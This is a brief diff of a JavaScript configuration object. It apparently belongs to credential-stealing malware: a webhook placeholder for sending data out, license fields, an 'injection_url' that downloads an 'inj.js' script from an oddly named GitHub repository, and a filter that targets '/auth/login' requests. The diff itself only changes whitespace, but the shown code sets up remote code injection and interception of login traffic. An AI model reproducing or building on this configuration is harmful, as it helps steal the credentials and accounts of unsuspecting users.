@@ -15,7 +15,7 @@ const CONFIG = {
     api: "%API_WEBHOOK%",
     license_api: "%LICENSE_API_URL%",
     license_key: "%LICENSE_KEY%",
-    injection_url: "https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/refs/heads/main/inj.js",
+    injection_url: "https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/refs/heads/main/inj.js", 
     filters: {
         urls: [
             '/auth/login',
